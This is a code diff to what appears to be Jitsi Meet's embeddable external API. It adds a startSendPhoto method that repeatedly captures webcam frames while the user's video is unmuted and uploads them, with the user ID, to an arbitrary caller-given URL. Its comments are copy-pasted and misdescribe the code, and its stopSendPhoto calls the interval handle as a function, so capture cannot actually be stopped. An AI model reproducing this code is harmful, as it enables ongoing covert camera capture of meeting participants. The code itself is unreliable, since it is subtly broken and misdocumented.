@@ -1,5 +1,6 @@
 import { jitsiLocalStorage } from '@jitsi/js-utils/jitsi-local-storage';
 import EventEmitter from 'events';
+import $ from 'jquery'
 
 import { urlObjectToString } from '../../../react/features/base/util/uri';
 import {
@@ -314,9 +315,78 @@ export default class JitsiMeetExternalAPI extends EventEmitter {
         this._participants = {};
         this._myUserID = undefined;
         this._onStageParticipant = undefined;
-        this._test = 'test'
         this._setupListeners();
+        this._interval = null;
         id++;
+    }
+
+    /**
+     * Getter for getUserMedia in Jitsi Meet.
+     *
+     * @returns {HTMLElement|undefined} - The requested video. Will return the local video
+     * by default if participantId is undefined.
+     */
+    async _getUserMedia() {
+        return await navigator.mediaDevices.getUserMedia({
+            audio: false,
+            video: true
+        });
+    }
+
+    /**
+     * Getter for getUserMedia in Jitsi Meet.
+     *
+     * @param {Object} options - The height of the iframe. Check.
+     *
+     * @returns {HTMLElement|undefined} - The requested video. Will return the local video
+     * by default if participantId is undefined.
+     */
+    async startSendPhoto(options = {}) {
+        const { interval = 3, url } = options;
+
+        const video = document.getElementById('local_video_capture');
+
+        if (!video) {
+            const v = document.createElement('video');
+
+            v.id = 'local_video_capture';
+            v.autoplay = true;
+            document.body.appendChild(v);
+        }
+
+        this._interval = setInterval(async () => {
+            if (!await this.isVideoMuted() && this._myUserID) {
+                // eslint-disable-next-line no-shadow
+                const video = document.getElementById('local_video_capture');
+
+                await this._getUserMedia().then(stream => {
+                    video.srcObject = stream;
+                });
+
+                const canvas = document.createElement('canvas');
+
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    $.ajax({
+                        url,
+                        type: 'POST',
+                        data: {
+                            image: canvas.toDataURL('image/webp'),
+                            uid: this._myUserID
+                        }
+                    });
+                }, 1000);
+            }
+        }, interval * 1000);
+    }
+
+    // eslint-disable-next-line require-jsdoc
+    async stopSendPhoto() {
+        if (this._interval) {
+            this._interval();
+        }
     }
 
     /**
